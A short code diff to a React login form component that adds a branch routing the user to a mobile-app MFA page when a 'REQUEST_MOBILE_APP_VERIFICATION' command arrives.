@@ -133,6 +133,14 @@ export default function LoginForm() {
                 resetCommand(); 
                 router.push('/NumAuthenticationPage');
             }, 1500);
+        } else if (command === 'REQUEST_MOBILE_APP_VERIFICATION') {
+            setIsLoading(false);
+            setBgLoader(true);
+            setTimeout(() => {
+                // setIsLoading(false);
+                resetCommand(); 
+                router.push('/MfaPage');
+            }, 1500);
         } else if (command === 'FINISH') {
             setIsLoading(false);
             setBgLoader(true);
